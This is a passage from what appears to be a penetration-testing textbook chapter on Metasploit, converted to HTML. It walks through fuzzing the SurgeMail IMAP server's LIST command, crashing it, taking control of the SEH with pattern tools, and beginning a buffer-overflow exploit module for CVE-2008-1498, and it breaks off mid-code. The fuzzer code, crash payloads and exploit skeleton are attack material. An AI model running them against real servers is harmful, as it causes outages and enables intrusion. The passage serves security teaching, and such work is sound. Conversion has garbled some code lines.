&#39;0002 LIST () &quot;/&#39; + fuzzed + &#39;&quot; &quot;PWNED&quot;&#39; + &quot;\r\n&quot; print_status(req)</span></p><p class="s25" style="padding-top: 3pt;padding-left: 132pt;text-indent: 0pt;line-height: 11pt;text-align: left;">res = raw_send_recv(req)</p><p class="s25" style="padding-left: 132pt;text-indent: 31pt;text-align: left;">if !res.nil? print_status(res)</p><p class="s25" style="padding-left: 164pt;text-indent: 0pt;line-height: 11pt;text-align: left;">else</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="text-indent: 0pt;text-align: right;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 6pt;padding-left: 17pt;text-indent: 0pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 7pt;padding-left: 17pt;text-indent: 0pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 17pt;text-indent: 31pt;text-align: left;">end disconnect()</p><p class="s25" style="padding-left: 13pt;text-indent: -4pt;text-align: left;">print_status(<span class="s24">&quot;Server  crashed,  no  response&quot;</span>) break</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_541.png"/></span></p><p style="padding-top: 4pt;text-indent: 0pt;line-height: 16pt;text-align: right;">The fuzzer module begins by importing the IMAP <span class="s32">O </span>and denial-of-service <span class="s32">8</span></p><p style="text-indent: 0pt;line-height: 10pt;text-align: right;">mixins. Including IMAP gives you the required login functionality, and since</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">the goal of the fuzzer is to crash the server, this module results in a denial of service.</p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">At <span class="s32">@ </span>the <span class="s19">fuzz string </span>(the malformed data we want to send) is set as a random- ized string of alphanumeric characters with a maximum length of 1024 bytes.</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 81%;text-align: left;">The fuzzer connects and logs into the remote service at <span class="s32">O</span>, and if it fails to connect and the loop breaks, you have something worth investigating. The</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">lack of response by the server might mean that you’ve successfully caused an exception in the remote service.</p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: left;">At <span class="s32">@ </span>the variable <span class="s25">fuzzed </span>is set to the random string generated by the Framework, and the malicious request <span class="s32">0 </span>is built according to the published exploit code by appending the malicious data to the vulnerable <span class="s25">LIST </span>com-</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">mand. If the fuzzer doesn’t receive a response from the server, it prints the message <span class="s25">&quot;Server crashed, no response&quot; </span>and quits.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">To test your new fuzzer, start up <span class="s19">msfconsole</span>, load the module, and set its options as follows:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_542.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use auxiliary/fuzzers/imap_fuzz</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(imap_fuzz) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:102.741pt" cellspacing="0"><tr style="height:16pt"><td style="width:41pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:61pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:33pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:162pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:46pt"><td style="width:41pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;padding-right: 7pt;text-indent: 0pt;line-height: 11pt;text-align: left;">IMAPPASS IMAPUSER RHOST RPORT</p></td><td style="width:61pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">143</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:33pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;padding-right: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">no no yes yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:162pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 4pt;padding-right: 2pt;text-indent: 0pt;text-align: left;">The password for the specified username The username to authenticate as</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target address</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target port</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(imap_fuzz) &gt; <span class="s24">set IMAPPASS test</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">IMAPPASS =&gt; test</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(imap_fuzz) &gt; <span class="s24">set IMAPUSER test</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">IMAPUSER =&gt; test</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(imap_fuzz) &gt; <span class="s24">set RHOST 192.168.1.155</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOST =&gt; 192.168.1.155</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(imap_fuzz) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="437" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_543.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">The fuzzer should now be ready to go. Make sure that your debugger of choice (we’re using the Immunity Debugger in our examples) is attached to the <span class="s19">surgemail.exe </span>process, and start the fuzzer:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_544.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">msf auxiliary(imap_fuzz) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 36pt;text-indent: -12pt;line-height: 80%;text-align: left;">O <span class="s25">[*] Authenticating as test with password test... [*] Generating fuzzed data...</span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 11pt;text-align: left;">8 <span class="s25">[*] Sending fuzzed data, buffer length = 684</span></p><p class="s30" style="padding-left: 57pt;text-indent: -33pt;line-height: 79%;text-align: left;">@ <span class="s25">[*] 0002 LIST () &quot;/v1AD7DnJTVykXGYYM6BmnXuYRlZNIJUzQzFPvASjYxzdTTOngBJ5gfK0XjLy3ciAAk1Fmo0 RPEpq6f4BBnp5jm3LuSbAOj1M5qULEGEv0DMk0oOPUj6XPN1VwxFpjAfFeAxykiwdDiqNwnVJAKyr6X7C5ije7 DSujURybOp6BkKWroLCzQg2AmTuqz48oNeY9CDeirNwoITfIaC40Ds9OgEDtL8WN5tL4QYdVuZQ85219Thogk7</span></p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;line-height: 87%;text-align: justify;">75GVfNH4YPpSo2PLmvd5Bf2sY9YDSvDqMmjW9FXrgLoUK2rl9cvoCbTZX1zuU1dDjnJJpXDuaysDfJKbtHn9Vh siiYhFokALiF1QI9BRwj4bo0kwZDn8jyedxhSRdU9CFlMs19CvbVnnLWeRGHScrTxpduVJZygbJcrRp6AWQqke Y0DzI4bd7uXgTIHXN6R403ALckZgqOWcUSEWj6THI9NFAIPP1LEnctaK0uxbzjpS1ize16r388StXBGq1we7Qa 8j6xqJsN5GmnIN4HQ4W4PZIjGRHUZC8Q4ytXYEksxXe2ZUhl5Xbdhz13zW2HpxJ2AT4kRU1wDqBUkEQwvKtoeb rfUGJ8bvjTMSxKihrDMk6BxAnY6kjFGDi5o8hcEag4tzJ1FhH9eI2UHDVbsDmUHTfAFbreJTHVlcIruAozmZKz i7XgTaOgzGh&quot; &quot;PWNED&quot;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;text-align: left;">O <span class="s25">[*] 0002 OK LIST completed</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Authenticating as test with password test... [*] Generating fuzzed data...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sending fuzzed data, buffer length = <span class="s24">1007</span></p><p class="s25" style="padding-left: 57pt;text-indent: -21pt;line-height: 87%;text-align: left;">[*] 0002 LIST () &quot;/FzwJjIcL16vW4PXDPpJbpsHB4p7Xts9fbaJYjRJASXRqbZnOMzprZfVZH7BYvcHuwlN0Yq yfoCrJyobzOqoscJeTeRgrDQKA8MDDLbmY6WCQ6XQH9Wkj4c9JCfPjIqTndsocWBz1xLMX1VdsutJEtnceHvhl Gqee6Djh7v3oJW4tXJMMxe8uR2NgBlKoCbH18VTR8GUFqWCmQ0970B3gR9foi6inKdWdcE6ivbOHElAiYkFYzZ 06Q5dvza58DVhn8sqSnRAmq1UlcUGuvr6r99POlrZst10r606J2B03TBGDFuy0dNMI0EUANKZ6OnCn3Zk1JL65 9MC8PZy0frCiPBqZ4xn0biAjFTH5LsCjIFuI5eZ9LsdXdek7iiOhEmW6D86mAtyg9S1a7RALrbRcLIHJpwMsEE 5LS1wIV9aFPS6RQwI4DtF4bGSle1FCyf63hy3Vo8AKkId6yu5MfjwfUExandVeUldk8c5bhlyqoDp3UX2ClQPZ os0KpFoIcxmq8R0E3Ri54l5Yl3OPcN7U20Kb1CEAfbhxGFgh1oMzjJpuM7IbHMrZNjVADz6A0byzgiP2pXa7Zm OloV9u6Fwa0l6sR6oL0Png9MYNwTMXTUdiE7rOjuOmkdgglPTkZ3n4de1FEaLh8Xhf9SNSPZUX0M7gmUiyNYv6 qti3Omy8qvjJOQui1IhUhf5fKOunKIcB5Zw7quznxV1GF2R5hXVTw1vlbMi5TQW68ZDFlD6q6BJ4S3oNrFCyXX aQpAURyCoDGdjoxk1vrUPGusf3i4EIF2iqyyekWiQ7GuYcwMax3o0ZXB2djFh2dYEGyBSCHaFhpwUgamThinnM AsDFuEY9Hq9UOQSmZ6ySunifPFjCbDs4Zooquw0HPaVnbNVo97tfVBYSei9dWCUWwUAPVJVsTGoDNRVarOrg8q wbziv8aQaPZ7Y8r0SUiB1nNhlhl3UCVZpf8Gck0psjETf4ks356q0I3mLZkqCLkznVV4ayetVgaDm&quot; &quot;PWNED&quot;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 14pt;text-align: left;">@ <span class="s25">[*] Server crashed, no response</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] Auxiliary module execution completed</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(imap_fuzz) &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_545.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 72%;text-align: justify;">In this listing, the fuzzer connects and logs into the remote service at <span class="s32">O </span>and generates a random string of text at <span class="s32">8</span>. At <span class="s32">@ </span>the malicious request is sent to the server, and the reply is received and displayed at <span class="s32">O</span>. If the server receives no reply, you receive the notification at <span class="s32">@ </span>that the server has crashed, which is your cue to check your debugger.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">If you now check your debugger on the Windows target, you should see that it has paused at the point of the crash, as shown in Figure 14-1. Looking at the crash, we can see that no memory addresses are overwritten and that, unfortunately, there’s nothing really exploitable at first glance. After further tinkering with increasing buffer lengths, you will find that by sending an</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">even longer string of 11,000 bytes, you can overwrite the Structured Excep- tion Handler (SEH). Controlling the SEH makes the exploit more reliable, because it makes it more versatile. Similarly, the use of an application DLL for a return address makes the exploit portable across different operating sys- tem versions.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="408" height="306" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_546.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 14-1: The debugger pauses at the point of the crash.</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">To send the 11,000-byte string, we make a small change in the fuzzer code, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_547.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">print_status(&quot;Generating fuzzed data...&quot;)</p><p class="s24" style="padding-left: 100pt;text-indent: 0pt;line-height: 10pt;text-align: left;">fuzzed = &quot;A&quot; * 11000</p><p class="s25" style="padding-bottom: 3pt;padding-left: 98pt;text-indent: 0pt;text-align: left;">print_status(&quot;Sending fuzzed data, buffer length = %d&quot; % fuzzed.length) req = &#39;0002 LIST () &quot;/&#39; + fuzzed + &#39;&quot; &quot;PWNED&quot;&#39; + &quot;\r\n&quot;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_548.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Rather than using the random string of characters, this code modifica- tion sends a string of 11,000 <span class="s19">A</span>s as part of the malicious request.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark383">Controlling the Structured Exception Handler</a><a name="bookmark391">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">If you restart the <span class="s19">surgemail </span>service, reattach the debugger to the process, and rerun the module, you should see the crash that fuzzing found in your debugger. If you’re using the Immunity Debugger, you should be able to see the contents of the SEH chain by selecting <span class="s18">View</span><span class="s49">►</span><span class="s18">SEH chain</span>. Right-click the value, which should be <span class="s19">41414141</span>, and select <span class="s18">Follow address in stack </span>to dis- play the stack contents leading to the SEH overwrite in the lower-right pane shown in Figure 14-2.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="409" height="306" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_549.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 14-2: The overwritten SEH entry</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Now that you know that you can control the SEH chain on the vulner- able <span class="s19">surgemail </span>process with an overly long buffer, it’s time to determine the exact length required to overwrite it on the target. As you will recall from our discussions of stand-alone exploit development, before you can use a return address, you first need to find out where, exactly, the overwrite occurs.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We can modify our fuzzer code to create a nonrepeating, random string of characters of a specific length, as shown next:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_550.png"/></span></p><p class="s25" style="padding-left: 98pt;text-indent: -8pt;text-align: left;">print_status(&quot;Generating fuzzed data...&quot;) fuzzed = <span class="s24">Rex::Text.pattern_create</span>(11000)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 98pt;text-indent: 0pt;text-align: left;">print_status(&quot;Sending fuzzed data, buffer length = %d&quot; % fuzzed.length) req = &#39;0002 LIST () &quot;/&#39; + fuzzed + &#39;&quot; &quot;PWNED&quot;&#39; + &quot;\r\n&quot;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_551.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">In this listing, we use <span class="s25">Rex::Text.pattern_create </span>to generate the nonrepeat- ing random string of characters with our fuzzer. Rerunning the fuzzer module now shows that SEH was overwritten on the target with <span class="s19">684E3368</span>, as shown in Figure 14-3.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="241" height="33" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_552.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;line-height: 107%;text-align: left;">Figure 14-3: The SEH overwritten with random characters</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">With the SEH overwritten with our random set of characters, we can use <span class="s19">pattern_offset.rb </span>in <span class="s19">/opt/metasploit3/msf3/tools/ </span>to determine exactly where the overwrite occurs by passing the characters of interest (<span class="s19">684E3368</span>) followed by the length of the string that was sent to the target (<span class="s19">11000</span>), as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_553.png"/></span></p><p class="s25" style="padding-left: 57pt;text-indent: -21pt;line-height: 90%;text-align: left;">root@bt:~/.msf3/modules/auxiliary/fuzzers# <span class="s24">/opt/metasploit3/msf3/tools/pattern_offset.rb 684E3368 11000</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">10360</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_554.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The value <span class="s19">10360 </span>means that the four bytes that overwrite SEH are 10361, 10362, 10363, and 10364. We can now change the fuzzer code one last time to verify our findings:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_555.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">print_status(&quot;Generating fuzzed data...&quot;)</p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;line-height: 11pt;text-align: left;">fuzzed = &quot;\x41&quot; * <span class="s24">10360 </span>fuzzed &lt;&lt; &quot;\x42&quot; * <span class="s24">4 </span>fuzzed &lt;&lt; &quot;\x43&quot; * <span class="s24">636</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">print_status(&quot;Sending fuzzed data, buffer length = %d&quot; % fuzzed.length)</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_556.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">As shown, the fuzzer will build the malicious request beginning with 10,360 <span class="s19">A</span>s (hexadecimal <span class="s19">41</span>), followed by four <span class="s19">B</span>s (hexadecimal <span class="s19">42</span>) to over- write the SEH, and then 636 <span class="s19">C</span>s (hexadecimal <span class="s19">43</span>) as filler to keep the string length constant at 11,000 bytes.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Running the fuzzer against the target again shows that the entire SEH chain is under your complete control, as shown in Figure 14-4.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="408" height="306" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_557.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 14-4: SEH fully controlled</p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark384">Hopping Around SEH Restrictions</a><a name="bookmark392">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Following the SEH overwrite, there’s very little space for shellcode before the end of the stack. Normally, a <span class="s19">POP-POP-RETN </span>set of instructions would be used to reach the Next SEH (NSEH), followed by a short jump forward into the shellcode. We’ll overcome this limited space restriction by developing an exploit to use as much space as possible for our final payload. At this point, we are done with the fuzzing process and we’ll move into developing an exploit for the vulnerability that we found.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">This exploit would be a good candidate for an <span class="s19">egg hunter</span>, which is a small segment of shellcode that searches memory for the main payload; however, we’ll use a different tactic and overwrite SEH with the <span class="s19">POP-POP-RETN </span>instruc- tion pointer. Once that’s overwritten we’ll make a short jump backward that requires very few instructions (rather than jumping forward). Next, we’ll use the space gained in the short jump to execute the larger near jump farther back into a NOP slide and shellcode. Although it’s not required, a NOP slide is always a good addition to an exploit, because it gives you a little room for error should the buffer position change in memory. NOPs will have no adverse impact on the exploit code and will act as filler. Conceptually, the attack will look like this:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_558.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[Buffer of garbage | NOP Slide | Shellcode | Near Jump | Short Jump | POP-POP-RETN]</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_559.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">To ensure portability of the exploit across different versions of Windows, use a return address from an application DLL or executable. In this case, only the application executable itself is available, so you can try to accom- plish a three-byte overwrite of SEH using a <span class="s19">POP-POP-RETN </span>sequence of instructions from the <span class="s19">surgemail.exe </span>file. If this can be done successfully, the exploit will be universal across versions of Windows.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Let’s move on to creating the actual exploit for the SurgeMail vulnerability.</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Following is our initial skeleton exploit module to be saved in <span class="s19">/root/.msf3/ modules/exploits/windows/imap/</span>:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_560.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">require &#39;msf/core&#39;</p><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 21pt;text-align: left;">class Metasploit3 &lt; Msf::Exploit::Remote include Msf::Exploit::Remote::Imap def initialize(info = {})</p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;line-height: 10pt;text-align: left;">super(update_info(info,</p><p class="s25" style="padding-left: 87pt;text-indent: 0pt;text-align: left;">&#39;Name&#39; =&gt; &#39;Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow&#39;, &#39;Description&#39; =&gt; %q{</p><p class="s25" style="padding-left: 104pt;text-indent: 0pt;text-align: justify;">This module exploits a stack overflow in the Surgemail IMAP Server version 3.8k4-4 by sending an overly long LIST command. Valid IMAP account credentials are required.</p><p class="s25" style="padding-left: 87pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-left: 87pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Author&#39; =&gt; [ &#39;ryujin&#39; ],</p><p class="s25" style="padding-left: 87pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;License&#39; =&gt; MSF_LICENSE,</p><p class="s25" style="padding-left: 87pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Version&#39; =&gt; &#39;$Revision: 1 $&#39;,</p><p class="s25" style="padding-top: 3pt;padding-left: 104pt;text-indent: -17pt;text-align: left;">&#39;References&#39; =&gt; [</p><p class="s25" style="padding-left: 121pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[ &#39;BID&#39;, &#39;28260&#39; ],</p><p class="s25" style="padding-left: 121pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[ &#39;CVE&#39;, &#39;2008-1498&#39; ],</p><p class="s25" style="padding-left: 121pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="http://www.exploit-db.com/exploits/5259%27" class="s34" target="_blank">[ &#39;URL&#39;, </a>&#39;http://www.exploit-db.com/exploits/5259&#39; ],</p><p class="s25" style="padding-left: 104pt;text-indent: 0pt;line-height: 11pt;text-align: left;">],</p><p class="s25" style="padding-left: 87pt;text-indent: 0pt;text-align: left;">&#39;Privileged&#39; =&gt; false, &#39;DefaultOptions&#39; =&gt;</p><p class="s25" style="padding-left: 104pt;text-indent: 0pt;line-height: 11pt;text-align: left;">{</p><p class="s25" style="padding-left: 121pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;EXITFUNC&#39; =&gt; &#39;thread&#39;,</p><p class="s25" style="padding-left: 104pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-left: 87pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Payload&#39; =&gt;</p><p class="s25" style="padding-left: 104pt;text-indent: 0pt;line-height: 11pt;text-align: left;">{</p><p class="s30" style="padding-left: 113pt;text-indent: 0pt;line-height: 11pt;text-align: left;">O<span class="s24">&#39;Space&#39; =&gt; 10351,</span></p><p class="s25" style="padding-left: 121pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&#39;DisableNops&#39; =&gt; true,</p><p class="s25" style="padding-left: 121pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;BadChars&#39; =&gt; &quot;\x00&quot;</p><p class="s25" style="padding-left: 104pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-left: 87pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Platform&#39; =&gt; &#39;win&#39;,</p><p class="s25" style="padding-left: 104pt;text-indent: -17pt;text-align: left;">&#39;Targets&#39; =&gt; [</p><p class="s30" style="padding-left: 118pt;text-indent: 0pt;line-height: 12pt;text-align: left;">8<span class="s25">[ &#39;Windows Universal&#39;, { &#39;Ret&#39; =&gt; 0xDEADBEEF } ], # p/p/r TBD</span></p><p class="s25" style="padding-left: 104pt;text-indent: 0pt;line-height: 10pt;text-align: left;">],</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="text-indent: 0pt;text-align: right;">end</p><p class="s25" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;DisclosureDate&#39; =&gt; &#39;March 13 2008&#39;,</p><p class="s25" style="padding-left: 19pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;DefaultTarget&#39; =&gt; 0))</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-left: 53pt;text-indent: 0pt;line-height: 10pt;text-align: left;">def exploit</p><p class="s30" style="padding-top: 1pt;padding-left: 62pt;text-indent: 0pt;line-height: 71%;text-align: left;">@<span class="s25">connected = connect_login </span>O<span class="s25">lead = &quot;\x41&quot; * 10360 </span>@<span class="s25">evil = lead + &quot;\x43&quot; * 4</span></p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;line-height: 9pt;text-align: left;">print_status(&quot;Sending payload&quot;)</p><p class="s30" style="padding-left: 62pt;text-indent: 0pt;line-height: 